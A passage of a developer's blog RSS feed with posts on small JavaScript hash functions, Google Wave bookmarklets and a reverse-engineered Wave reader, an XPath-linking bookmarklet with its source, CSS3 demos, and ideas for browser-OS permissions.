&lt;p&gt;I have no idea if it would work, and obviously it won’t work nearly as well as the LCD ones. Surely it would probably be pretty annoying to have light shine in your eyes, though I would hope its not that annoying. I’m not sure how it would work either, would it make your pupils shrink, and would your eye detect the un-brightened frame as dark? Or would the LED make everything white and everything hard to see, and be the equivalent of darkening everything away? Would this vary from person to person and setup-to-setup?&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Javascript SHA1 and SHA256 in</title>
      <link>http://antimatter15.com/2010/01/javascript-sha1-and-sha256-in/</link>
      <pubDate>Sat, 02 Jan 2010 22:38:29 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/01/javascript-sha1-and-sha256-in/</guid>
      <author></author>
      <description>&lt;p&gt;Not sure why I made this, but here’s some super tiny implementation of some cryptographic functions. There are some optimizations made for size rather than speed (especially with SHA256), for instance, there are some 71 constants which are used in SHA256 which in most implementations are stored precomputed (they take up around 1KB in hexadecimal), but with mine, they are computed at runtime, which adds a significant runtime penalty, taking twice as long as comparable implementations. It should also be noted that it doesn’t do any UTF8 encoding that some other implementations do, but it can be added by UTF8 encoding the text before running it through the functions.&lt;/p&gt;
&lt;p&gt;SHA1&lt;/p&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://gist.github.com/267720.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;SHA256&lt;/p&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://gist.github.com/268113.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;MIT licensed, but please post a comment if you plan on using it.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Project Wikify Updated</title>
      <link>http://antimatter15.com/2009/12/project-wikify-updated/</link>
      <pubDate>Mon, 28 Dec 2009 03:22:03 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/12/project-wikify-updated/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Project%20Wikify%20Updated/screenshot_056.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Project%20Wikify%20Updated/screenshot_056-300x220.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Wikify Updated&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In 2008 (That long ago, I know!), I started something called &lt;a href=&quot;http://wikify.antimatter15.com/&quot;&gt;Project Wikify&lt;/a&gt;. Basically, it was a bookmarklet which let people edit stuff on web pages and &lt;em&gt;save it onto a server&lt;/em&gt;. A lot of people may be aware of the simple thing where pasting javascript:document.designMode=”on”; into the URL bar makes the internet explode into awesomeness such as replacing every other word in this blog with the name of a certain genitalia. Of course, the absolutely huge issue with this is that you really can’t &lt;em&gt;share&lt;/em&gt; your &lt;em&gt;awesome&lt;/em&gt; creation.&lt;/p&gt;
&lt;p&gt;So here comes Wikify to fix that, the age-old problem of sharing your vandalized sites has been finally resolved….  a year ago. And since then, nobody really has ever cared.&lt;/p&gt;
&lt;p&gt;So, I looked back at it last week, and realized how painfully crappy the website for it was. To fix it, I decided to test out iWeb, yes, a totally non-leet WYSIWYG editor. But yes, that’s how crappy my web-design skills are, so the result is quite an improvement. Anyway, I used the Blank-Page template, so at least you can spare your eyes from yet another generic theme (&lt;em&gt;cough this blog cough&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;While designing the site, I tried out Wikify and discovered that it didn’t work on Wikipedia articles and the News button didn’t work. So I quickly got those features working, so now i’m writing this blog post about my tiny edits and the new site.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://wikify.antimatter15.com/&quot;&gt;http://wikify.antimatter15.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Unread Navigator</title>
      <link>http://antimatter15.com/2009/12/wave-unread-navigator/</link>
      <pubDate>Sun, 13 Dec 2009 07:42:59 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/12/wave-unread-navigator/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Wave%20Unread%20Navigator/screenshot_050.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;screenshot_050&quot;  src=&quot;/articles/2009/Wave%20Unread%20Navigator/screenshot_050.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;screenshot_050&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I made an extension which shows a green sign (like gmail) on the side whenever there are blips outside the viewport. It allows you to quickly and effectively use keyboard navigation without blindly checking above and below, or generally scroll without needing to guess the position.&lt;/p&gt;
&lt;p&gt;It comes as a &lt;a href=&quot;https://chrome.google.com/extensions/detail/jncflgepcddhcejhofdojlkjgjhcfmpc&quot;&gt;Chrome Extension&lt;/a&gt; and also as a &lt;a href=&quot;http://antimatter15.com/misc/wave/wavenavigation.user.js&quot;&gt;Greasemonkey Userscript&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>The future of the Ajax Animator</title>
      <link>http://antimatter15.com/2009/12/the-future-of-the-ajax-animator/</link>
      <pubDate>Fri, 11 Dec 2009 23:27:55 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/12/the-future-of-the-ajax-animator/</guid>
      <author></author>
      <description>&lt;p&gt;Eventually, what will happen is a pluggable editor system and swapping between the new Mini UI and the old standard UI. The pluggable editor system will enable switching between the existing VectorEditor and OnlyPaths editors as well as SVG-edit. Possibly, OnlyPaths will be phased out as SVG-edit supports every feature of the former as well as many more. The priority editors with the new version will be VectorEditor (the Mini UI editor, based on Raphael so it works fine cross-browser, but is also much more limiting than the rest, including OnlyPaths which it partially replaces). SVG-edit is an awesome project which is being actively developed, and will add new features that may make the Ajax Animator viable for more than just stick figures. New features that will come from the transition could include Gradients, Curved paths, Wireframes, Zoom, Groups, Align tools, Rotation and Resizing (without bugs!), Polygon/Polyline editing, to name a small subset. It’s likely that SVG-edit will have far more features by the time it’s fully implemented. It’ll be awesome.&lt;/p&gt;
&lt;p&gt;The SVG-edit UI won’t fit well with the Mini UI (which I actually like more), so the classical UI will be revived.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>CSS3 Sideways Google</title>
      <link>http://antimatter15.com/2009/12/css3-sideways-google/</link>
      <pubDate>Mon, 07 Dec 2009 22:56:57 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/12/css3-sideways-google/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/CSS3%20Sideways%20Google/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/CSS3%20Sideways%20Google/Screenshot-202x300.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I was surprised to find that one of the main referrers to my site recently has been Twitter. Looking into it, it seems to all be for my quickly hacked together &lt;a href=&quot;http://antimatter15.com/misc/rotatedgooglecss3.html&quot;&gt;CSS3 Sideways Google&lt;/a&gt;. Which uses the new CSS3 transforms supported by Webkit and Gecko (Firefox, Chrome and Safari) as well as the freaky DirectX stuff Microsoft has (Only major browser that isn’t supported is Opera, who is lagging a bit).&lt;/p&gt;
&lt;p&gt;And in the spirit of CSS3 Sideways Google, I present &lt;a href=&quot;http://antimatter15.com/misc/elgoogcss3.html&quot;&gt;CSS3 elgooG&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It also appears that the awesome &lt;a href=&quot;http://rotateme.org&quot;&gt;rotateme.org&lt;/a&gt; website was built entirely off of the original CSS3 Sideways Google and actually got 1500 diggs :)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave uses Closure</title>
      <link>http://antimatter15.com/2009/11/wave-uses-closure/</link>
      <pubDate>Sun, 08 Nov 2009 00:27:38 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/11/wave-uses-closure/</guid>
      <author></author>
      <description>&lt;p&gt;Closure Tools were &lt;a href=&quot;http://googlecode.blogspot.com/2009/11/introducing-closure-tools.html&quot;&gt;recently released&lt;/a&gt; by Google to allow for others to use the same rich libraries that Google uses internally. Its used by Gmail, Google Docs and Google Maps, but interestingly also used by Google Wave. While they don’t actually announce that Closure is used in Wave, the view-source obfuscated mess from Wave does strongly show it.The reason why its use in wave is more interesting than most others is that Wave is in GWT, while the rest are pure JS. This implies that an interface to the Closure Library may be coming to GWT. While the interface doesn’t seem to be made from Closure, there are references to “closure_hashCode” and “goog.net.BrowserChannel”.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Wave Search Pause Button</title>
      <link>http://antimatter15.com/2009/11/wave-search-pause-button/</link>
      <pubDate>Fri, 06 Nov 2009 05:06:07 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/11/wave-search-pause-button/</guid>
      <author></author>
      <description>&lt;p&gt;An issue now with the floods (is there any post about wave complete without a pun?) of people in wave, the with:public channel (of waves!) is becoming a unusable tsunami (har har har) of waves where clicking on one will end up opening up something else totally randomly as it has shifted down several by the time you click it.&lt;/p&gt;
&lt;p&gt;So what is there to stop it? Well, I made this insanely great, floodwall: the Wave Pause button. It’s a simple bookmarklet that if you click, it stops all incoming updates to the search panel and clicking it again restores it.&lt;/p&gt;
&lt;p&gt;The functional bookmarklet can be found at &lt;a href=&quot;http://antimatter15.com/misc/wave/pause.html&quot;&gt;http://antimatter15.com/misc/wave/pause.html&lt;/a&gt; which is a rather hideous looking page hacked together quickly.&lt;/p&gt;
&lt;p&gt;How does that work? Well, it turns out it’s actually not that easy. My first idea was to just find the function which updated things (it turned out to be Vwh) and replace it with function(){} and restore it later. That worked fine… But I remembered some evil crap that google said, about GWT source being browser-targeted. Incidentally that means Wave gets dfferent versions of the code with different function names, and if they ever update wave, all the function names screw up too!&lt;/p&gt;
&lt;p&gt;Oh noes! What now? Well, it uses a sort of pseudo-heuristic approach. It searches for a big characteristic which is .style[w2g]. BUUT, w2g is fwg in chrome! So first it iterates through all variables and finds one whose value equals “display”. Then it takes that variable name, and searches for functions which have .style[name of string which equals display] twice. That reduces the pool significantly. Then it checks to make sure it has the string .innerHTML in it, and has 4 arguments. After that, well, you are reduced to a single function and you can use the same method described above.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>XPath Bookmark Bookmarklet</title>
      <link>http://antimatter15.com/2009/11/xpath-bookmark-bookmarklet/</link>
      <pubDate>Sun, 01 Nov 2009 00:33:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/11/xpath-bookmark-bookmarklet/</guid>
      <author></author>
      <description>&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;javascript:(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;//inspired by http://userscripts.org/scripts/show/8924&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; s = &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;hljs-string&quot;&gt;'script'&lt;/span&gt;);
  s.setAttribute(&lt;span class=&quot;hljs-string&quot;&gt;'src'&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;'http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js'&lt;/span&gt;);
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; jQuery==&lt;span class=&quot;hljs-string&quot;&gt;'undefined'&lt;/span&gt;) &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.getElementsByTagName(&lt;span class=&quot;hljs-string&quot;&gt;'head'&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].appendChild(s);
  (&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; jQuery==&lt;span class=&quot;hljs-string&quot;&gt;'undefined'&lt;/span&gt;) setTimeout(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;.callee, &lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;)
    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
      jQuery(&lt;span class=&quot;hljs-string&quot;&gt;&quot;*&quot;&lt;/span&gt;).one(&lt;span class=&quot;hljs-string&quot;&gt;&quot;click&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(event)&lt;/span&gt;&lt;/span&gt;{
        &lt;span class=&quot;hljs-comment&quot;&gt;//http://snippets.dzone.com/posts/show/4349&lt;/span&gt;
        &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; path = &lt;span class=&quot;hljs-string&quot;&gt;''&lt;/span&gt;, elt = jQuery(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]; elt &amp;amp;&amp;amp; elt.nodeType==&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; elt=elt.parentNode){
          &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; idx = jQuery(elt.parentNode).children(elt.tagName).index(elt)+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;
          idx&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; ? (idx=&lt;span class=&quot;hljs-string&quot;&gt;'['&lt;/span&gt;+idx+&lt;span class=&quot;hljs-string&quot;&gt;']'&lt;/span&gt;) : (idx=&lt;span class=&quot;hljs-string&quot;&gt;''&lt;/span&gt;);
          path=&lt;span class=&quot;hljs-string&quot;&gt;'/'&lt;/span&gt;+elt.tagName.toLowerCase()+idx+path;
        }
        &lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.location.hash = &lt;span class=&quot;hljs-string&quot;&gt;&quot;#xpath:&quot;&lt;/span&gt;+path
        event.stopImmediatePropagation()
      })
    }
  })();
})()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sometimes you want to link to a certain part of a web page. That’s great and works well if its a nice site that clearly defines anchor tags to link to, but what if there isn’t?&lt;/p&gt;
&lt;p&gt;Today I just remembered something and I thought that I saw something earlier with a xpath URL hash. I googled it and couldn’t find anything native to the browser (please correct me if I’m wrong) but found this script: &lt;a href=&quot;http://userscripts.org/scripts/show/8924&quot;&gt;http://userscripts.org/scripts/show/8924&lt;/a&gt; which is basically what I was thinking about. But it was allegedly hard to make those URLs, so I thought why not make a bookmarklet to make linking to those URLs simple? So I quickly hacked this together&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;javascript:(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; a=&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;hljs-string&quot;&gt;&quot;script&quot;&lt;/span&gt;);a.setAttribute(&lt;span class=&quot;hljs-string&quot;&gt;&quot;src&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js&quot;&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; jQuery==&lt;span class=&quot;hljs-string&quot;&gt;&quot;undefined&quot;&lt;/span&gt;){&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.getElementsByTagName(&lt;span class=&quot;hljs-string&quot;&gt;&quot;head&quot;&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].appendChild(a)}(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; jQuery==&lt;span class=&quot;hljs-string&quot;&gt;&quot;undefined&quot;&lt;/span&gt;){setTimeout(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;.callee,&lt;span class=&quot;hljs-number&quot;&gt;100&lt;/span&gt;)}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{jQuery(&lt;span class=&quot;hljs-string&quot;&gt;&quot;*&quot;&lt;/span&gt;).one(&lt;span class=&quot;hljs-string&quot;&gt;&quot;click&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(d)&lt;/span&gt;&lt;/span&gt;{jQuery(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;].scrollIntoView();&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; e=&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;,c=jQuery(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;];c&amp;amp;amp;&amp;amp;amp;c.nodeType==&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;c=c.parentNode){&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; b=jQuery(c.parentNode).children(c.tagName).index(c)+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;b&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;?(b=&lt;span class=&quot;hljs-string&quot;&gt;&quot;[&quot;&lt;/span&gt;+b+&lt;span class=&quot;hljs-string&quot;&gt;&quot;]&quot;&lt;/span&gt;):(b=&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);e=&lt;span class=&quot;hljs-string&quot;&gt;&quot;/&quot;&lt;/span&gt;+c.tagName.toLowerCase()+b+e}&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.location.hash=&lt;span class=&quot;hljs-string&quot;&gt;&quot;#xpath:&quot;&lt;/span&gt;+e;d.preventDefault();d.stopPropagation();jQuery(&lt;span class=&quot;hljs-string&quot;&gt;&quot;*&quot;&lt;/span&gt;).unbind(&lt;span class=&quot;hljs-string&quot;&gt;&quot;click&quot;&lt;/span&gt;,&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;.callee)})}})()})();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(Just drag it over to your bookmarks bar as with any other bookmarklet). To use, just click on the bookmark, and click on the element you want to link to. You should see the URL will update with a xpath hash showing you the copy-pastable link to that element. The code is quite simple and should work on Firefox, Chrome and all the other browsers (maybe even IE) but the ability to auto-scroll and actually use the links is only available to Firefox and potentially Opera and Chrome.&lt;/p&gt;
&lt;p&gt;And I’m working on a Chrome Extension for the original userscript (which should work with Chrome’s userscript support, but I’m going to try packaging it as a chrome extension file) But sadly chromium for linux isnt up to speed especially with extension development.&lt;/p&gt;
&lt;p&gt;The source can be found &lt;a href=&quot;http://gist.github.com/223708&quot;&gt;http://gist.github.com/223708&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Update:&lt;/em&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt; _Fixed the link for the path and added some stuff. &lt;strong&gt;Update 2&lt;/strong&gt;&lt;em&gt;_: Fixed bookmarklet, now scrolls to clicked, executes only once, prevents default&lt;/em&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Real Wave Desktop Reader</title>
      <link>http://antimatter15.com/2009/10/real-wave-desktop-reader/</link>
      <pubDate>Thu, 29 Oct 2009 06:33:13 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/10/real-wave-desktop-reader/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2009/Real%20Wave%20Desktop%20Reader/screenshot_134.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2009/Real%20Wave%20Desktop%20Reader/screenshot_134-300x246.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;screenshot_134&lt;/div&gt;&lt;/div&gt;&lt;/a&gt; Very exciting, I know.&lt;/p&gt;
&lt;p&gt;Some people have probably heard of WaveBoard, the application for iPhone and OS X that claims to be a desktop client for wave. However, it’s really just a webkit browser that has some extra triggers for some better desktop integration. But it’s still not a real Wave client. Obviously cause doing so would be insanely hard and since the Client/Server protocol isn’t released, has to be reverse engineered.&lt;/p&gt;
&lt;p&gt;So I reverse engineered part of Wave that allows an entire wave to be downloaded and parsed into blips with tree structure.&lt;/p&gt;
&lt;p&gt;I’m careful to title this a Wave desktop reader because it only does reading and in the crudest of forms.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://static-bot.appspot.com/view/?id=googlewave.com!w+Ze3l0mj0A&quot;&gt;http://static-bot.appspot.com/view/?id=googlewave.com!w+Ze3l0mj0A&lt;/a&gt; the state of Google Wave does seem to have changed, so this post, from June 30th 2010 at 6:43am (which is what Wordpress says, but I have a hard time believing as I usually am not up that early. But obviously this commentary is from much after, after the great wave-announcement of the end of the year) Anyway, static-bot (which later became wavereader and then anonybot) has deceased in the most horrific way, and while the original Wave is still accessible, it probably won’t be for long (by the time I have my next eruption of nostalgia in a few months), Wave may have already died. So It’s probably best to paste information that was there into this post&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;span style=&quot;text-decoration: underline;&quot;&gt;For the Google Wave Client/Server protocol documentation, scroll down. For documentation which relates to stuff other than loading a wave (eg, search, playback, etc) See &lt;a href=&quot;https://wave.google.com/wave/?pli=1#restored:wave:googlewave.com!w%2BTklMo2zsB&quot;&gt;“Google Wave Protocol Documentation”&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I spent a bit of time with firebug trying to reverse engineer some parts of Wave’s complex inner workings. I’ve made a offline wave reader using this amazing technology.&lt;/p&gt;
&lt;p&gt;This is way different from &lt;a href=&quot;https://wave.google.com/wave/?pli=1#restored:wave:googlewave.com!w%2BJqkvHvfWI&quot;&gt;Waveboard&lt;/a&gt; which is an embedded Webkit for a mac application which has some extra bindings for somewhat better desktop integration. It is &lt;em&gt;not&lt;/em&gt; a &lt;em&gt;real&lt;/em&gt; desktop client (technically, neither is this, but this is closer). This one is based on a reverse engineered part of the Wave client-server protocol (which hasn’t been released, hence reverse engineering).&lt;/p&gt;
&lt;p&gt;But first, to make clear the limitations:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Does not contain a web renderer so no images, embeds, gadgets, etc&lt;/li&gt;
&lt;li&gt;Does not maintain an active connection for real time updates&lt;/li&gt;
&lt;li&gt;Can not submit updates (no OT)&lt;/li&gt;
&lt;li&gt;Can not list waves&lt;/li&gt;
&lt;li&gt;Can not create waves&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So what can it do? It can read a wave, and create a raw text backup. While not terribly exciting, it’s still progress. It is usually quite a bit faster than Wave at loading things.&lt;/p&gt;
&lt;p&gt;**Download (Read Usage below):&lt;/p&gt;
&lt;p&gt;**&lt;a href=&quot;http://dl.getdropbox.com/u/1024307/pywavereader/login.py&quot;&gt; http://dl.getdropbox.com/u/1024307/pywavereader/login.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://dl.getdropbox.com/u/1024307/pywavereader/read.py&quot;&gt; http://dl.getdropbox.com/u/1024307/pywavereader/read.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;**Usage:&lt;/p&gt;
&lt;p&gt;** Yay, the fun part. This isn’t very user friendly, so be warned. Unless you’ve used the command line before, it may be insanely scary.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download the files.&lt;/li&gt;
&lt;li&gt;Extract it somewhere&lt;/li&gt;
&lt;li&gt;Go to that directory from the command line&lt;/li&gt;
&lt;li&gt;Run python login.py USERNAME PASSWORD (Feel free to check the source if you’re afraid its gonna steal your credentials)&lt;/li&gt;
&lt;li&gt;Watch as some awesome info piles down and state.txt is generated&lt;/li&gt;
&lt;li&gt;Run python read.py WAVEID&lt;/li&gt;
&lt;li&gt;This part is weirdish. Since bash (for me) throws random errors and all the waves you can see are on googlewave.com!w+ anyway, a shorter wave ID can be used which lacks the part before the + sign. For example, this wave’s short ID is Ze3l0mj0A&lt;/li&gt;
&lt;li&gt;Watch as the wave’s contents are populated onto the command line notably without order (may be fixed eventually, probably not).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Future:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I’m trying to find out how the Wave searches are done and that might be next, soon a mostly usable read-only wave client may be possible. It would be great if people could help in this process.&lt;/p&gt;
&lt;p&gt;Licensed under GPLv3 and made in Python (Yeah, commandline ftw). The code is pretty crappy, I’m not especially good at Python but at least it’s cross platform. Probably someone could hook it up to a web server to give access to public Wave content to the general public. Maybe this will spark some future wave desktop client.&lt;/p&gt;
&lt;p&gt;And obviously, some time in september, Google will decide to shut down Wave because it was super experimental and rendered this all useless and one day on the cold not snowy monday afternoon of december twenty seventh the year 2010 though the relative epoch really isnt that important, so you could also say that it’s year 40 if you use the unix epoch. And obviously this was not in the initial post.&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    <item>
      <title>withpublic not working</title>
      <link>http://antimatter15.com/2009/10/withpublic-not-working/</link>
      <pubDate>Mon, 19 Oct 2009 07:55:35 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/10/withpublic-not-working/</guid>
      <author></author>
      <description>&lt;p&gt;It seems that after a recent update to wave, with:public only shows the waves which are already in your inbox. A simple remedy is to use group:public@a.gwave.com instead of with:public. I found it on &lt;a href=&quot;http://www.google.com/support/forum/p/wave/thread?tid=10eaba86d62c005c&amp;amp;hl=en&quot;&gt;http://www.google.com/support/forum/p/wave/thread?tid=10eaba86d62c005c&amp;amp;hl=en&lt;/a&gt; &lt;/p&gt;
</description>
    </item>
    <item>
      <title>my ideas for a browser os are coming true.</title>
      <link>http://antimatter15.com/2009/10/my-ideas-for-a-browser-os-are-coming-true/</link>
      <pubDate>Wed, 07 Oct 2009 23:33:55 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/10/my-ideas-for-a-browser-os-are-coming-true/</guid>
      <author></author>
      <description>&lt;p&gt;Yes, I know that the title is lowercase with a period in the end. It’s totally strange and inconsistent but it &lt;em&gt;feels&lt;/em&gt; right.&lt;/p&gt;
&lt;p&gt;Google’s working on a notification API for Chrome. Chrome has a Pin Tab feature. Firefox has Faviconize Tab. Gears has a basic privledge escalation (not very fine grained yet). Firefox shows UAC-type privledge escalation for storing data and Geolocation.&lt;/p&gt;
&lt;p&gt;To review the old post, this is how I think Chrome OS might work. All user facing applications (all apps other than the window manager, kernel, browser, should be user facing) should operate in Tabs. There are two types of tabs, “pinned” tabs and normal browsing tabs. Pinned tabs are automatically loaded when the user is logged in, are only a tiny icon, but are still always visible.&lt;/p&gt;
&lt;p&gt;There will be a unified and consistent way for the user to voluntarily grant privledges to a web site that requests it. It won’t be a catch-all i-totally-trust-this-app-to-every-bit-of-data-on-my-HDD sort of system that most operating systems use. It will be very fine grained, you can grant access to XHRs to a certain domain and huge warnings if the site requires access to the wildcard &lt;em&gt;. The privledges can extend from just accessing the notification API, cross domain XHR, geolocation, and &lt;strong&gt;communicating with other tabs&lt;/strong&gt;. Communication with other tabs should be dome something like cross domain XHR, by allowing the user to grant a tab access to a certain domain/url. I would prefer the permissions dialog to be something less of a modal window that is employed by Gears or the little thing that pops up on the top for Firefox, and more of a icon that subtly appears somewhere that the user can click voluntarily. I think a UAC type stop-what-youre-doing-to-show-a-scary-message dialog is horrible and makes the user incapable of deciding intelligently. If there were a button which would make a box filled with checkboxes and a green/red gradient safety bar with messages, and educating the user that he or she really &lt;em&gt;*does not have to give the site permissions&lt;/em&gt;&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A typical application such as a mail notifier would be as follows&lt;/p&gt;
